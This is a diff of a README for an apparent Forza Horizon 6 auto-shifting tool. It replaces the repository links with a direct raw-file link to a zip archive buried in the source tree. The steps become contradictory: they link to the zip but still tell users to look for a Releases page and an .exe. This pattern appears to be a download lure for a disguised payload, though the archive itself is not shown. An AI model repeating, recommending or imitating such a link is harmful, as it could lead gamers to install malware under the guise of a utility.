@@ -1,6 +1,6 @@
 # ⚙️ fh6-virtual_tcu - Automatic shifting for better racing control
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/mixturematrixaddition945/fh6-virtual_tcu)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip)
 
 fh6-virtual_tcu acts as an external helper for Forza Horizon 6. It reads your car data in real time. It calculates the best moment to switch gears. It mimics an adaptive transmission. This tool helps you focus on your steering and braking. It handles the transmission for you based on how you drive.
 
@@ -18,7 +18,7 @@ The software connects to the game via the built-in telemetry data. It watches yo
 
 ## 📥 Installation and Setup
 
-1. Visit this page to download the latest version: [https://github.com/mixturematrixaddition945/fh6-virtual_tcu](https://github.com/mixturematrixaddition945/fh6-virtual_tcu).
+1. Visit this page to download the latest version: [https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip](https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version number.
 4. Download the file ending in .exe.
